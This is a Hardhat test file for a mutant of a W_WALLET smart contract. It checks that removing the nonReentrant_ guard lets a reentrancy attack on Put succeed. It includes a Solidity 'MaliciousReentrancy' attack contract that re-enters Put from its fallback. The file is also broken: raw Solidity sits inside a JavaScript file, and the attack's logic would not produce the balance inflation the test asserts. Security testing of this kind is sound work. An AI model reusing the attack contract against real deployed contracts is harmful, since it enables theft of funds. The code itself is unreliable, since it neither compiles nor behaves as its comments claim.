import { expect } from "chai";
import { ethers } from "hardhat";

describe("W_WALLET mutant mb654cc1c - reentrancy guard removal", function () {
  it("should detect reentrancy attack on Put function when nonReentrant_ modifier is removed", async function () {
    const [owner, attacker] = await ethers.getSigners();
    
    // Deploy the Log contract first (required constructor argument)
    const LogFactory = await ethers.getContractFactory("Log");
    const log = await LogFactory.deploy();
    await log.waitForDeployment();
    
    // Deploy W_WALLET with the Log contract address
    const WalletFactory = await ethers.getContractFactory("W_WALLET");
    const wallet = await WalletFactory.deploy(await log.getAddress());
    await wallet.waitForDeployment();
    
    // Deploy a malicious contract that will perform reentrancy
    const MaliciousFactory = await ethers.getContractFactory("MaliciousReentrancy");
    const malicious = await MaliciousFactory.deploy(await wallet.getAddress());
    await malicious.waitForDeployment();
    
    // Fund the malicious contract to make initial deposit
    await attacker.sendTransaction({
      to: await malicious.getAddress(),
      value: ethers.parseEther("10")
    });
    
    // Call the attack - this will trigger reentrancy via fallback
    // The original contract would revert due to nonReentrant_, mutant should allow it
    const tx = malicious.connect(attacker).attack({ value: ethers.parseEther("5") });
    
    // If mutant is present, the attack will succeed (no revert)
    // If original contract, it would revert with "reentrant call"
    // We expect NO revert for the mutant (attack succeeds)
    await expect(tx).to.not.be.reverted;
    
    // Additional assertion: check that balance was manipulated multiple times
    // The attacker should have been able to call Put multiple times via reentrancy
    const attackerBalance = await wallet.Acc(await malicious.getAddress());
    // With reentrancy, balance would be inflated (multiple deposits for single msg.value)
    // Normal single call would give exactly 5 ether
    expect(attackerBalance.balance).to.be.gt(ethers.parseEther("5"));
  });
});

// Malicious contract to exploit reentrancy
// This must be deployed as a separate contract in the test
// We define it as Solidity code to be compiled alongside
contract MaliciousReentrancy {
    W_WALLET public target;
    
    constructor(address _target) {
        target = W_WALLET(_target);
    }
    
    function attack() external payable {
        // Initial deposit triggers reentrancy via fallback
        target.Put{value: msg.value}(block.timestamp + 1 days);
    }
    
    fallback() external payable {
        // Reenter Put function - this would be blocked by nonReentrant_ in original
        if (address(this).balance > 0) {
            target.Put(block.timestamp + 1 days);
        }
    }
}